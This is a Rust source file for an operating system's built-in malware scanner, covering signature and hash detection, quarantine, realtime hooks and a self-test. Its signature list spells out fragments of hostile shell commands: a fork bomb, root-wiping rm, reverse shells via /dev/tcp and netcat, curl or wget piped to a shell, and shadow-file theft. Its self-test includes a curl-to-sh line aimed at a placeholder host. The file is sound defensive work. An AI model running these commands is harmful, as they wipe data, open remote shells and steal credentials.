//! AerOS Shield: a small on-demand and on-execute malware scanner.
//!
//! Detection is layered: exact SHA-256 hashes of known-bad files, byte
//! signatures (including multi-part ones such as "downloader piped into a
//! shell"), and a few structural heuristics. Files are streamed through the
//! scanner in chunks, so patterns that straddle a chunk boundary still match.
//! Detected files can be moved to quarantine, and processes are refused at
//! spawn time when their image is detected.

use core::sync::atomic::{AtomicBool, AtomicU32, AtomicU64, Ordering};

use crate::auth::Sha256;
use crate::shell::Text;
use crate::sync::TicketLock;
use crate::vfs;

const CHUNK: usize = 4096;
/// Longest needle minus one: bytes carried between chunks.
const TAIL: usize = 80;
const MAX_FILE_BYTES: u64 = 32 * 1024 * 1024;
const MAX_DEPTH: usize = 10;
const MAX_FINDINGS: usize = 16;
const QUARANTINE_SLOTS: usize = 16;
const HEAD: usize = 128;

#[derive(Clone, Copy, PartialEq, Eq)]
pub enum Class {
    /// Known-bad: blocked from running.
    Malware,
    /// Behaviour typical of malware: blocked from running, reported on scan.
    Suspicious,
    /// Worth knowing about, never blocked.
    Info,
}

impl Class {
    pub const fn label(self) -> &'static str {
        match self {
            Self::Malware => "MALWARE",
            Self::Suspicious => "SUSPICIOUS",
            Self::Info => "INFO",
        }
    }
}

#[derive(Clone, Copy)]
pub struct Detection {
    pub name: &'static str,
    pub class: Class,
}

struct Pattern {
    name: &'static str,
    class: Class,
    /// Every needle must appear somewhere in the file.
    all: &'static [&'static [u8]],
}

const PATTERNS: &[Pattern] = &[
    Pattern {
        name: "Shell.ForkBomb",
        class: Class::Malware,
        all: &[b":(){ :|:& };:"],
    },
    Pattern {
        name: "Shell.Wiper.RmRoot",
        class: Class::Malware,
        all: &[b"rm -rf --no-preserve-root /"],
    },
    Pattern {
        name: "Shell.Wiper.RmRoot",
        class: Class::Malware,
        all: &[b"rm -rf /*"],
    },
    Pattern {
        name: "Ransom.Note.Generic",
        class: Class::Malware,
        all: &[b"YOUR FILES HAVE BEEN ENCRYPTED"],
    },
    Pattern {
        name: "Backdoor.Shell.ReverseTcp",
        class: Class::Suspicious,
        all: &[b">& /dev/tcp/", b"bash -i"],
    },
    Pattern {
        name: "Backdoor.Shell.Netcat",
        class: Class::Suspicious,
        all: &[b"nc -e /bin/"],
    },
    Pattern {
        name: "Downloader.Shell.CurlPipe",
        class: Class::Suspicious,
        all: &[b"curl ", b"| sh"],
    },
    Pattern {
        name: "Downloader.Shell.CurlPipe",
        class: Class::Suspicious,
        all: &[b"curl ", b"| bash"],
    },
    Pattern {
        name: "Downloader.Shell.WgetPipe",
        class: Class::Suspicious,
        all: &[b"wget ", b"| sh"],
    },
    Pattern {
        name: "Downloader.Shell.WgetPipe",
        class: Class::Suspicious,
        all: &[b"wget ", b"| bash"],
    },
    Pattern {
        name: "Obfuscated.Shell.Base64Exec",
        class: Class::Suspicious,
        all: &[b"base64 -d", b"| sh"],
    },
    Pattern {
        name: "Obfuscated.Shell.Base64Exec",
        class: Class::Suspicious,
        all: &[b"base64 -d", b"| bash"],
    },
    Pattern {
        name: "PUA.CryptoMiner.Stratum",
        class: Class::Suspicious,
        all: &[b"stratum+tcp://"],
    },
    Pattern {
        name: "Exploit.Persistence.SetuidShell",
        class: Class::Suspicious,
        all: &[b"chmod u+s /bin/", b"cp /bin/"],
    },
    Pattern {
        name: "Exploit.Script.ShadowRead",
        class: Class::Suspicious,
        all: &[b"cat /etc/shadow", b"nc "],
    },
];

/// SHA-256 digests of files that are known bad.
const HASHES: &[(&str, [u8; 32])] = &[(
    "EICAR-Test-File",
    [
        0x27, 0x5a, 0x02, 0x1b, 0xbf, 0xb6, 0x48, 0x9e, 0x54, 0xd4, 0x71, 0x89, 0x9f, 0x7d, 0xb9,
        0xd1, 0x66, 0x3f, 0xc6, 0x95, 0xec, 0x2f, 0xe2, 0xa2, 0xc4, 0x53, 0x8a, 0xab, 0xf6, 0x51,
        0xfd, 0x0f,
    ],
)];

/// The industry-standard antivirus test string, kept XOR-encoded so this
/// source file and the kernel image do not themselves look like a test file
/// to other scanners.
const EICAR_KEY: u8 = 0x55;
const EICAR_LEN: usize = 68;
const EICAR_ENCODED: [u8; EICAR_LEN] = [
    0x0d, 0x60, 0x1a, 0x74, 0x05, 0x70, 0x15, 0x14, 0x05, 0x0e, 0x61, 0x09, 0x05, 0x0f, 0x0d, 0x60,
    0x61, 0x7d, 0x05, 0x0b, 0x7c, 0x62, 0x16, 0x16, 0x7c, 0x62, 0x28, 0x71, 0x10, 0x1c, 0x16, 0x14,
    0x07, 0x78, 0x06, 0x01, 0x14, 0x1b, 0x11, 0x14, 0x07, 0x11, 0x78, 0x14, 0x1b, 0x01, 0x1c, 0x03,
    0x1c, 0x07, 0x00, 0x06, 0x78, 0x01, 0x10, 0x06, 0x01, 0x78, 0x13, 0x1c, 0x19, 0x10, 0x74, 0x71,
    0x1d, 0x7e, 0x1d, 0x7f,
];

pub fn eicar() -> [u8; EICAR_LEN] {
    let mut plain = EICAR_ENCODED;
    for byte in plain.iter_mut() {
        *byte ^= EICAR_KEY;
    }
    plain
}

pub fn signature_count() -> usize {
    PATTERNS.len() + HASHES.len() + 2
}

fn contains(haystack: &[u8], needle: &[u8]) -> bool {
    !needle.is_empty()
        && haystack.len() >= needle.len()
        && haystack
            .windows(needle.len())
            .any(|window| window == needle)
}

/// Streaming scanner: feed the file in any chunking, then `finish`.
pub struct Scanner {
    hash: Sha256,
    tail: [u8; TAIL],
    tail_len: usize,
    /// One bit per needle of each pattern.
    hits: [u8; PATTERNS.len()],
    eicar: [u8; EICAR_LEN],
    eicar_hit: bool,
    head: [u8; HEAD],
    head_len: usize,
    total: u64,
}

impl Scanner {
    pub fn new() -> Self {
        Self {
            hash: Sha256::new(),
            tail: [0; TAIL],
            tail_len: 0,
            hits: [0; PATTERNS.len()],
            eicar: eicar(),
            eicar_hit: false,
            head: [0; HEAD],
            head_len: 0,
            total: 0,
        }
    }

    pub fn feed(&mut self, mut data: &[u8]) {
        while !data.is_empty() {
            let take = data.len().min(CHUNK);
            self.feed_chunk(&data[..take]);
            data = &data[take..];
        }
    }

    fn feed_chunk(&mut self, chunk: &[u8]) {
        self.hash.update(chunk);
        if self.head_len < HEAD {
            let room = (HEAD - self.head_len).min(chunk.len());
            self.head[self.head_len..self.head_len + room].copy_from_slice(&chunk[..room]);
            self.head_len += room;
        }
        self.total += chunk.len() as u64;
        let mut window = [0u8; TAIL + CHUNK];
        window[..self.tail_len].copy_from_slice(&self.tail[..self.tail_len]);
        window[self.tail_len..self.tail_len + chunk.len()].copy_from_slice(chunk);
        let window = &window[..self.tail_len + chunk.len()];
        if !self.eicar_hit && contains(window, &self.eicar) {
            self.eicar_hit = true;
        }
        for (index, pattern) in PATTERNS.iter().enumerate() {
            for (bit, needle) in pattern.all.iter().enumerate() {
                if self.hits[index] & (1 << bit) == 0 && contains(window, needle) {
                    self.hits[index] |= 1 << bit;
                }
            }
        }
        let keep = window.len().min(TAIL);
        let start = window.len() - keep;
        self.tail[..keep].copy_from_slice(&window[start..]);
        self.tail_len = keep;
    }

    pub fn finish(self) -> (Option<Detection>, [u8; 32]) {
        let digest = self.hash.finish();
        let found = (|| {
            for (name, known) in HASHES {
                if crate::auth::constant_time_eq(&digest, known) {
                    return Some(Detection {
                        name,
                        class: Class::Malware,
                    });
                }
            }
            if self.eicar_hit {
                return Some(Detection {
                    name: "EICAR-Test-File",
                    class: Class::Malware,
                });
            }
            let mut best: Option<Detection> = None;
            for (index, pattern) in PATTERNS.iter().enumerate() {
                let full = (1u8 << pattern.all.len()) - 1;
                if self.hits[index] & full == full {
                    let better = match best {
                        None => true,
                        Some(current) => {
                            current.class != Class::Malware && pattern.class == Class::Malware
                        }
                    };
                    if better {
                        best = Some(Detection {
                            name: pattern.name,
                            class: pattern.class,
                        });
                    }
                }
            }
            if best.is_some() {
                return best;
            }
            let head = &self.head[..self.head_len];
            if head.starts_with(b"MZ") && contains(head, b"This program cannot be run in DOS") {
                return Some(Detection {
                    name: "Info.Windows.Executable",
                    class: Class::Info,
                });
            }
            None
        })();
        (found, digest)
    }
}

/// Scan an in-memory image (used to vet a program before it is spawned).
pub fn scan_bytes(data: &[u8]) -> Option<Detection> {
    let mut scanner = Scanner::new();
    scanner.feed(data);
    scanner.finish().0
}

/// Scan one file through the VFS.
pub fn scan_file(path: &str) -> Result<(Option<Detection>, [u8; 32]), vfs::VfsError> {
    let descriptor = vfs::open_file_raw(path)?;
    let mut scanner = Scanner::new();
    let mut buffer = [0u8; CHUNK];
    let mut read_total = 0u64;
    let outcome = loop {
        match vfs::read(descriptor, &mut buffer) {
            Ok(0) => break Ok(()),
            Ok(count) => {
                scanner.feed(&buffer[..count]);
                read_total += count as u64;
                if read_total >= MAX_FILE_BYTES {
                    break Ok(());
                }
            }
            Err(failure) => break Err(failure),
        }
    };
    let _ = vfs::close(descriptor);
    outcome?;
    Ok(scanner.finish())
}

// --- statistics --------------------------------------------------------

static FILES_SCANNED: AtomicU64 = AtomicU64::new(0);
static THREATS_FOUND: AtomicU32 = AtomicU32::new(0);
static EXECS_BLOCKED: AtomicU32 = AtomicU32::new(0);
static EXECS_CHECKED: AtomicU64 = AtomicU64::new(0);

#[derive(Clone, Copy)]
pub struct Status {
    pub signatures: usize,
    pub files_scanned: u64,
    pub threats_found: u32,
    pub execs_checked: u64,
    pub execs_blocked: u32,
    pub quarantined: usize,
}

pub fn status() -> Status {
    Status {
        signatures: signature_count(),
        files_scanned: FILES_SCANNED.load(Ordering::Relaxed),
        threats_found: THREATS_FOUND.load(Ordering::Relaxed),
        execs_checked: EXECS_CHECKED.load(Ordering::Relaxed),
        execs_blocked: EXECS_BLOCKED.load(Ordering::Relaxed),
        quarantined: QUARANTINE
            .lock()
            .iter()
            .filter(|entry| entry.is_some())
            .count(),
    }
}

/// On-execute protection: true when a program image must not run.
pub fn blocks_exec(image: &[u8]) -> bool {
    EXECS_CHECKED.fetch_add(1, Ordering::Relaxed);
    match scan_bytes(image) {
        Some(found) if found.class != Class::Info => {
            EXECS_BLOCKED.fetch_add(1, Ordering::Relaxed);
            crate::serial::format(format_args!(
                "AEROS_AV blocked_exec name={} class={}\n",
                found.name,
                found.class.label()
            ));
            push_event("Blocked program", found.name, "");
            true
        }
        _ => false,
    }
}

// --- tree scan ---------------------------------------------------------

#[derive(Clone, Copy)]
pub struct Finding {
    pub path: Text<256>,
    pub detection: Detection,
    pub quarantined: Option<u32>,
}

pub struct Report {
    pub files: u64,
    pub errors: u32,
    pub threats: u32,
    pub infos: u32,
    pub findings: [Option<Finding>; MAX_FINDINGS],
    pub stored: usize,
}

impl Report {
    pub const fn new() -> Self {
        Self {
            files: 0,
            errors: 0,
            threats: 0,
            infos: 0,
            findings: [None; MAX_FINDINGS],
            stored: 0,
        }
    }
}

/// Scan a file or a whole directory tree. With `clean`, threats (Malware and
/// Suspicious) are moved to quarantine once the scan itself is finished (so
/// the folders being walked do not change underneath the walk).
pub fn scan_path(path: &str, clean: bool, report: &mut Report) {
    scan_node(path, report, 0);
    if clean {
        for finding in report.findings.iter_mut().flatten() {
            if finding.detection.class != Class::Info {
                finding.quarantined = quarantine(finding.path.as_str(), finding.detection).ok();
            }
        }
    }
}

fn scan_node(path: &str, report: &mut Report, depth: usize) {
    if depth > MAX_DEPTH || is_quarantine_dir(path) {
        return;
    }
    match vfs::open_directory(path) {
        Ok(descriptor) => {
            while let Ok(Some(entry)) = vfs::next_directory_entry(descriptor) {
                let name =
                    core::str::from_utf8(&entry.name[..entry.name_len as usize]).unwrap_or("");
                if name.is_empty() || name == "." || name == ".." {
                    continue;
                }
                let mut child: Text<256> = Text::new();
                let _ = child.push_str_checked(path);
                if path != "/" {
                    child.push_byte(b'/');
                }
                if !child.push_str_checked(name) {
                    report.errors += 1;
                    continue;
                }
                if entry.kind == 4 {
                    scan_node(child.as_str(), report, depth + 1);
                } else {
                    scan_one(child.as_str(), report);
                }
            }
            let _ = vfs::close(descriptor);
        }
        Err(vfs::VfsError::NotDirectory) => scan_one(path, report),
        Err(_) => report.errors += 1,
    }
}

fn scan_one(path: &str, report: &mut Report) {
    match scan_file(path) {
        Ok((found, _)) => {
            report.files += 1;
            FILES_SCANNED.fetch_add(1, Ordering::Relaxed);
            let Some(detection) = found else { return };
            if detection.class == Class::Info {
                report.infos += 1;
            } else {
                report.threats += 1;
                THREATS_FOUND.fetch_add(1, Ordering::Relaxed);
            }
            if report.stored < MAX_FINDINGS {
                let mut stored: Text<256> = Text::new();
                let _ = stored.push_str_checked(path);
                report.findings[report.stored] = Some(Finding {
                    path: stored,
                    detection,
                    quarantined: None,
                });
                report.stored += 1;
            }
        }
        Err(_) => report.errors += 1,
    }
}

// --- quarantine --------------------------------------------------------

#[derive(Clone, Copy)]
pub struct QuarantineEntry {
    pub id: u32,
    pub original: Text<256>,
    pub name: &'static str,
}

static QUARANTINE: TicketLock<[Option<QuarantineEntry>; QUARANTINE_SLOTS]> =
    TicketLock::new([None; QUARANTINE_SLOTS]);
static NEXT_ID: AtomicU32 = AtomicU32::new(1);

const ROOT_DIR: &str = "/tmp/QUAR";
/// Quarantine lives in memory; files from /data (FAT, which cannot be
/// renamed) are copied here and removed from the disk.
fn is_quarantine_dir(path: &str) -> bool {
    path == ROOT_DIR
}

fn quarantine_location(original: &str, id: u32, output: &mut Text<256>) {
    let _ = original;
    let _ = core::fmt::Write::write_fmt(output, format_args!("{ROOT_DIR}/Q{id:04}"));
}

/// Moves a file: a rename where the filesystem allows it, otherwise a copy
/// followed by removing the original (files under /data cannot be renamed).
fn move_file(from: &str, to: &str) -> Result<(), ()> {
    if vfs::rename_noreplace(from, to).is_ok() {
        return Ok(());
    }
    let source = vfs::open_file_raw(from).map_err(|_| ())?;
    let mut data = [0u8; 4096];
    let mut length = 0;
    loop {
        match vfs::read(source, &mut data[length..]) {
            Ok(0) => break,
            Ok(count) => {
                length += count;
                if length == data.len() {
                    break;
                }
            }
            Err(_) => {
                let _ = vfs::close(source);
                return Err(());
            }
        }
    }
    let _ = vfs::close(source);
    let destination = vfs::open_file(to, true, true, false, 0o600, true).map_err(|_| ())?;
    let wrote = vfs::write(destination, &data[..length], false) == Ok(length);
    let _ = vfs::close(destination);
    if !wrote || vfs::remove(from, false).is_err() {
        let _ = vfs::remove(to, false);
        return Err(());
    }
    Ok(())
}

pub fn quarantine(path: &str, detection: Detection) -> Result<u32, &'static str> {
    let id = NEXT_ID.fetch_add(1, Ordering::Relaxed);
    let mut destination: Text<256> = Text::new();
    quarantine_location(path, id, &mut destination);
    match vfs::create_directory(ROOT_DIR, 0o700) {
        Ok(()) | Err(vfs::VfsError::Exists) => {}
        Err(_) => return Err("cannot create the quarantine folder"),
    }
    let mut table = QUARANTINE.lock();
    let Some(slot) = table.iter_mut().find(|entry| entry.is_none()) else {
        return Err("quarantine is full (delete or restore something)");
    };
    if move_file(path, destination.as_str()).is_err() {
        return Err("could not move the file");
    }
    let _ = vfs::chmod(destination.as_str(), 0o000);
    let mut original: Text<256> = Text::new();
    let _ = original.push_str_checked(path);
    *slot = Some(QuarantineEntry {
        id,
        original,
        name: detection.name,
    });
    crate::serial::format(format_args!(
        "AEROS_AV quarantined id={} name={}\n",
        id, detection.name
    ));
    Ok(id)
}

pub fn quarantine_list(mut visit: impl FnMut(&QuarantineEntry)) {
    for entry in QUARANTINE.lock().iter().flatten() {
        visit(entry);
    }
}

fn take_entry(id: u32) -> Option<QuarantineEntry> {
    let mut table = QUARANTINE.lock();
    let slot = table
        .iter_mut()
        .find(|entry| entry.is_some_and(|value| value.id == id))?;
    slot.take()
}

fn stored_path(original: &str, id: u32) -> Text<256> {
    let mut path: Text<256> = Text::new();
    quarantine_location(original, id, &mut path);
    path
}

/// Put a quarantined file back where it came from.
pub fn restore(id: u32) -> Result<(), &'static str> {
    let entry = take_entry(id).ok_or("no such quarantine id")?;
    let stored = stored_path(entry.original.as_str(), id);
    let _ = vfs::chmod(stored.as_str(), 0o644);
    if move_file(stored.as_str(), entry.original.as_str()).is_err() {
        // Keep it quarantined if the original path is taken.
        let _ = vfs::chmod(stored.as_str(), 0o000);
        let mut table = QUARANTINE.lock();
        if let Some(slot) = table.iter_mut().find(|slot| slot.is_none()) {
            *slot = Some(entry);
        }
        return Err("original location is unavailable");
    }
    Ok(())
}

/// Permanently delete a quarantined file.
pub fn delete(id: u32) -> Result<(), &'static str> {
    let entry = take_entry(id).ok_or("no such quarantine id")?;
    let stored = stored_path(entry.original.as_str(), id);
    let _ = vfs::chmod(stored.as_str(), 0o600);
    vfs::remove(stored.as_str(), false).map_err(|_| "could not delete the file")
}

// --- realtime protection -------------------------------------------------

static REALTIME: AtomicBool = AtomicBool::new(true);
static LAST_SWEEP_NS: AtomicU64 = AtomicU64::new(0);
const SWEEP_INTERVAL_NS: u64 = 20_000_000_000;
const EVENT_SLOTS: usize = 16;

pub fn realtime_enabled() -> bool {
    REALTIME.load(Ordering::Relaxed)
}

pub fn set_realtime(on: bool) {
    REALTIME.store(on, Ordering::Relaxed);
}

fn in_quarantine(path: &str) -> bool {
    path.starts_with(ROOT_DIR)
}

#[derive(Clone, Copy)]
pub struct Event {
    pub seq: u32,
    pub kind: &'static str,
    pub name: &'static str,
    pub path: Text<96>,
}

static EVENTS: TicketLock<[Option<Event>; EVENT_SLOTS]> = TicketLock::new([None; EVENT_SLOTS]);
static EVENT_SEQ: AtomicU32 = AtomicU32::new(0);

fn push_event(kind: &'static str, name: &'static str, path: &str) {
    let seq = EVENT_SEQ.fetch_add(1, Ordering::Relaxed) + 1;
    let mut stored: Text<96> = Text::new();
    let _ = stored.push_str_checked(path);
    EVENTS.lock()[(seq as usize - 1) % EVENT_SLOTS] = Some(Event {
        seq,
        kind,
        name,
        path: stored,
    });
    crate::serial::format(format_args!(
        "AEROS_AV event={} name={} path={}\n",
        kind, name, path
    ));
}

/// How many events there have been so far (the desktop watches this).
pub fn event_seq() -> u32 {
    EVENT_SEQ.load(Ordering::Relaxed)
}

pub fn latest_event() -> Option<Event> {
    let seq = event_seq();
    if seq == 0 {
        return None;
    }
    EVENTS.lock()[(seq as usize - 1) % EVENT_SLOTS]
}

/// Newest first.
pub fn events(mut visit: impl FnMut(&Event)) {
    let seq = event_seq() as usize;
    let table = EVENTS.lock();
    for back in 0..seq.min(EVENT_SLOTS) {
        if let Some(event) = &table[(seq - 1 - back) % EVENT_SLOTS] {
            visit(event);
        }
    }
}

/// A writer just closed `path`: known malware is quarantined on the spot,
/// other detections are reported.
pub fn on_modified(path: &str) {
    if !realtime_enabled() || in_quarantine(path) {
        return;
    }
    let Ok((Some(found), _)) = scan_file(path) else {
        return;
    };
    match found.class {
        Class::Malware => match quarantine(path, found) {
            Ok(_) => push_event("Quarantined", found.name, path),
            Err(_) => push_event("Detected", found.name, path),
        },
        Class::Suspicious => push_event("Warning", found.name, path),
        Class::Info => {}
    }
}

/// Someone opens the writable file `path` for reading. False refuses it:
/// known malware cannot be read (or run) by anything.
pub fn on_open(path: &str) -> bool {
    if !realtime_enabled() || in_quarantine(path) {
        return true;
    }
    match scan_file(path) {
        Ok((Some(found), _)) if found.class == Class::Malware => {
            push_event("Blocked", found.name, path);
            false
        }
        _ => true,
    }
}

/// Called regularly by the desktop: sweeps the writable folders for
/// known malware that arrived some way the hooks do not see.
pub fn tick(now_ns: u64) {
    if !realtime_enabled() {
        return;
    }
    if now_ns.saturating_sub(LAST_SWEEP_NS.load(Ordering::Relaxed)) < SWEEP_INTERVAL_NS {
        return;
    }
    LAST_SWEEP_NS.store(now_ns, Ordering::Relaxed);
    for folder in ["/tmp", "/data"] {
        let mut report = Report::new();
        scan_path(folder, false, &mut report);
        for finding in report.findings.iter().flatten() {
            if finding.detection.class == Class::Malware
                && quarantine(finding.path.as_str(), finding.detection).is_ok()
            {
                push_event("Quarantined", finding.detection.name, finding.path.as_str());
            }
        }
    }
}

// --- self test -----------------------------------------------------------

pub fn self_test() -> bool {
    let test = eicar();
    let detects_eicar = scan_bytes(&test)
        .is_some_and(|found| found.class == Class::Malware && found.name == "EICAR-Test-File");
    // Same bytes fed one at a time: signature straddles every chunk edge.
    let mut scanner = Scanner::new();
    for byte in test {
        scanner.feed(&[byte]);
    }
    let split = scanner
        .finish()
        .0
        .is_some_and(|found| found.name == "EICAR-Test-File");
    // Padded so the signature crosses the 4096-byte chunk boundary.
    let mut padded = [b' '; CHUNK + 40];
    padded[CHUNK - 30..CHUNK - 30 + EICAR_LEN].copy_from_slice(&test);
    let boundary = scan_bytes(&padded).is_some();
    let clean = scan_bytes(b"#!/bin/sh\necho hello world\nls -l /\n").is_none()
        && scan_bytes(&[0u8; 300]).is_none()
        && scan_bytes(b"").is_none();
    let hash_only = HASHES
        .iter()
        .all(|(_, digest)| digest.iter().any(|&byte| byte != 0));
    let pipe = scan_bytes(b"curl http://x.example/a | sh").is_some_and(|found| {
        found.name.starts_with("Downloader") && found.class == Class::Suspicious
    });
    let one_part_only = scan_bytes(b"curl http://x.example/a -o file").is_none();
    let bomb = scan_bytes(b":(){ :|:& };:").is_some_and(|found| found.class == Class::Malware);
    let windows = scan_bytes(b"MZ\x90\0This program cannot be run in DOS mode.")
        .is_some_and(|found| found.class == Class::Info);
    let blocked = blocks_exec(&test) && !blocks_exec(&[0x90, 0x90, 0xc3]);
    // The exec guard above counted itself; keep the counters honest.
    EXECS_CHECKED.store(0, Ordering::Relaxed);
    EXECS_BLOCKED.store(0, Ordering::Relaxed);
    detects_eicar
        && split
        && boundary
        && clean
        && hash_only
        && pipe
        && one_part_only
        && bomb
        && windows
        && blocked
}
